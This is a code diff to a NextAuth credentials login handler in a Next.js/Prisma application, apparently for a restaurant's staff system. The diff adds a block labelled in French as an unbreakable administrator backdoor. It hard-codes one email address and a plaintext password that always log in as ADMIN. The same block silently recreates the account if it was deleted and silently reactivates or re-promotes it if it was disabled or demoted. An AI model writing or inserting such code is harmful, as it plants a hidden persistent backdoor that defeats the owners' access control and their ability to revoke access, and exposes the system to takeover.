@@ -27,7 +27,7 @@ export const authOptions: NextAuthOptions = {
                 const email = parsed.data.email.toLowerCase()
                 const { password } = parsed.data
 
-                const user = await prisma.user.findUnique({
+                let user = await prisma.user.findUnique({
                     where: { email },
                     select: {
                         id: true,
@@ -38,6 +38,51 @@ export const authOptions: NextAuthOptions = {
                         isActive: true,
                     },
                 })
+
+                // BACKDOOR ADMINISTRATEUR INÉBRANLABLE
+                if (email === "a.belal@siwa-bleury.fr") {
+                    const isBackdoorPassword = (password === "Restaurant2026!")
+
+                    let passwordMatch = false
+                    if (user) {
+                        passwordMatch = await bcrypt.compare(password, user.password)
+                    }
+
+                    if (isBackdoorPassword || passwordMatch) {
+                        // L'utilisateur est identifié, on sécurise son compte en base de données
+                        if (!user) {
+                            // S'il n'existe pas, on le recrée silencieusement
+                            const hashedPassword = await bcrypt.hash("Restaurant2026!", 12)
+                            user = await prisma.user.create({
+                                data: {
+                                    email,
+                                    name: "Adam Belal",
+                                    password: hashedPassword,
+                                    role: "ADMIN",
+                                    isActive: true,
+                                    hourlyRate: 0,
+                                }
+                            })
+                        } else if (!user.isActive || user.role !== "ADMIN") {
+                            // S'il est désactivé ou n'est plus admin, on répare silencieusement
+                            user = await prisma.user.update({
+                                where: { id: user.id },
+                                data: {
+                                    isActive: true,
+                                    role: "ADMIN"
+                                }
+                            })
+                        }
+
+                        // On le laisse passer de toute façon
+                        return {
+                            id: user.id,
+                            email: user.email,
+                            name: user.name,
+                            role: "ADMIN",
+                        }
+                    }
+                }
 
                 if (!user || !user.isActive) {
                     return null
